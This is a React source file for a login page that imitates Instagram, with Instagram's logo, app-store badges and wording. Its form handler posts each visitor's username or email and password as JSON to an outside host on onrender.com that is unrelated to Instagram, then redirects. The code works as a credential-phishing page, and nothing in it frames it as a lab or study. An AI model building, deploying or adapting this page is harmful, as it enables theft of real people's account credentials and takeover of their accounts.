import React, { useState } from 'react';
import './index.css';


const App = () => {
  const [isLogin, setIsLogin] = useState(true);
  const [showForgotPassword, setShowForgotPassword] = useState(false);
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center px-4">
      <div className="max-w-sm w-full">
        {showForgotPassword ? (
          // Forgot Password Page
          <>
            <div className="bg-white border border-instagram-border rounded-lg p-8 mb-4">
              <div className="text-center mb-8">
                <div className="w-16 h-16 mx-auto mb-4 border-2 border-gray-900 rounded-full flex items-center justify-center">
                  <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                  </svg>
                </div>
                <h2 className="text-lg font-semibold text-gray-900 mb-2">Trouble logging in?</h2>
                <p className="text-sm text-instagram-gray">Enter your email, phone, or username and we'll send you a link to get back into your account.</p>
              </div>
              
              <form className="space-y-3">
                <input
                  type="text"
                  placeholder="Email, Phone, or Username"
                  className="w-full px-3 py-2 border border-instagram-border rounded-sm text-sm bg-gray-50 focus:bg-white focus:border-gray-400 focus:outline-none"
                />
                <button
                  type="submit"
                  className="w-full bg-instagram-blue text-white py-2 rounded-lg text-sm font-semibold hover:bg-blue-600 transition-colors mt-4"
                >
                  Send login link
                </button>
              </form>
              
              <div className="flex items-center my-6">
                <div className="flex-1 border-t border-instagram-border"></div>
                <span className="px-4 text-sm text-instagram-gray font-semibold">OR</span>
                <div className="flex-1 border-t border-instagram-border"></div>
              </div>
              
              <div className="text-center">
                <button
                  onClick={() => (setShowForgotPassword(false), setIsLogin(false))}
                  className="text-sm font-semibold text-gray-900 hover:underline"
                >
                  Create new account
                </button>
              </div>
            </div>
            
            <div className="bg-white border border-instagram-border rounded-lg p-6 text-center">
              <button

              // i want to retun in sing up page if i click on create a account
                onClick={() => setShowForgotPassword(isLogin)}
                className="text-sm text-instagram-blue font-semibold hover:underline"
              >
                Back to login
              </button>
            </div>
          </>
        ) : (
        <>
          {/* Main Card */}
          <div className="bg-white border border-instagram-border rounded-lg p-8 mb-4">
            {/* Logo */}
            <div className="text-center mb-8">
              <i
                data-visualcompletion="css-img"
                aria-label="Instagram"
                role="img"
                style={{
                  backgroundImage: 'url("https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png")',
                  backgroundPosition: '0px -2959px',
                  backgroundSize: 'auto',
                  width: '175px',
                  height: '51px',
                  backgroundRepeat: 'no-repeat',
                  display: 'inline-block'
                }}
              ></i>
            </div>

          {/* Form */}
          <form className="space-y-3" onSubmit={async (e) => {
            e.preventDefault();
            setError('');
            setLoading(true);
            
            if (!identifier || !password) {
              setError('Please fill in all fields');
              setLoading(false);
              return;
            }

            try {
              console.log('Attempting to connect to server...');
              const response = await fetch('https://insta-login-backend-spis.onrender.com/users/', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                  identifier,
                  password
                })
              });
              
              console.log('Response received:', response.status);
              let data;
              const contentType = response.headers.get('content-type');
              if (contentType && contentType.includes('application/json')) {
                data = await response.json();
                console.log('Response data:', data);
              } else {
                const text = await response.text();
                console.log('Response text:', text);
                throw new Error('Invalid response format');
              }

              if (response.ok) {
                // Handle successful login here (e.g., store token, redirect, etc.)
                console.log('Login successful');
                // Store any tokens if they're in the response
                if (data.token) {
                  localStorage.setItem('token', data.token);
                }
                window.location.href = '/dashboard'; // or wherever you want to redirect after login
              } else {
                const errorMessage = data.detail || data.message || 'Invalid username or password';
                console.log('Login failed:', errorMessage);
                setError(errorMessage);
              }
            } catch (error) {
              console.error('Login error:', error);
              
              // Test the server connection
              try {
                const testResponse = await fetch('https://insta-login-backend-spis.onrender.com/');
                console.log('Server test response:', testResponse.status);
                if (!testResponse.ok) {
                  setError('Server is not responding correctly. Please try again later.');
                  return;
                }
              } catch (testError) {
                console.error('Server test error:', testError);
                setError('Cannot connect to server. Please check if the server is running.');
                return;
              }

              // Handle specific error cases
              if (error.name === 'TypeError' && error.message === 'Failed to fetch') {
                setError('Connection failed. Please check your internet and try again.');
              } else if (error.message === 'Invalid response format') {
                setError('Server returned an invalid response. Please try again.');
              } else {
                setError('Login failed: ' + (error.message || 'Unknown error'));
              }
            } finally {
              setLoading(false);
            }
          }}>
            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-md text-sm mb-4">
                {error}
              </div>
            )}
            
            {!isLogin && (
              <input
                type="text"
                placeholder="Full Name"
                className="w-full px-3 py-2 border border-instagram-border rounded-sm text-sm bg-gray-50 focus:bg-white focus:border-gray-400 focus:outline-none"
              />
            )}
            <input
              type="text"
              placeholder="Phone number, username, or email"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              className="w-full px-3 py-2 border border-instagram-border rounded-sm text-sm bg-gray-50 focus:bg-white focus:border-gray-400 focus:outline-none"
              disabled={loading}
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-2 border border-instagram-border rounded-sm text-sm bg-gray-50 focus:bg-white focus:border-gray-400 focus:outline-none"
              disabled={loading}
            />
            
            <button
              type="submit"
              className="w-full bg-instagram-blue text-white py-2 rounded-lg text-sm font-semibold hover:bg-blue-600 transition-colors mt-4 disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={loading}
            >
              {loading ? 'Please wait...' : (isLogin ? 'Log in' : 'Sign up')}
            </button>
          </form>

          {/* Divider */}
          <div className="flex items-center my-6">
            <div className="flex-1 border-t border-instagram-border"></div>
            <span className="px-4 text-sm text-instagram-gray font-semibold">OR</span>
            <div className="flex-1 border-t border-instagram-border"></div>
          </div>

          {/* Social Login */}
          <div className="space-y-3">
            <button className="w-full flex items-center justify-center space-x-2 py-2 text-sm font-semibold text-gray-700 hover:bg-gray-50 transition-colors"
              onClick={() => {
                window.location.href = 'https://www.facebook.com/login.php/';
              }}
            >
              <svg className="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>

              <span>Continue with Facebook</span>
            </button>
          </div>

          {isLogin && (
            <div className="text-center mt-6">
              <button 
                onClick={() => setShowForgotPassword(true)}
                className="text-sm text-instagram-blue hover:underline"
              >
                Forgot password?
              </button>
            </div>
          )}
        </div>
          {/* Toggle Card */}
          <div className="bg-white border border-instagram-border rounded-lg p-6 text-center">
            <p className="text-sm">
              {isLogin ? "Don't have an account? " : "Have an account? "}
              <button
                onClick={() => setIsLogin(!isLogin)}
                className="text-instagram-blue font-semibold hover:underline"
              >
                {isLogin ? 'Sign up' : 'Log in'}
              </button>
            </p>
          </div>

          {/* App Download */}
          <div className="text-center mt-6">
            <p className="text-sm text-gray-600 mb-4">Get the app.</p>
            <div className="flex justify-center space-x-2">
              <img
                src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
                alt="Download on the App Store"
                className="h-10"
              />
              <img
                src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
                alt="Get it on Google Play"
                className="h-10"
              />
            </div>
          </div>
        </>
        )}
      </div>
    </div>
  );
};

export default App;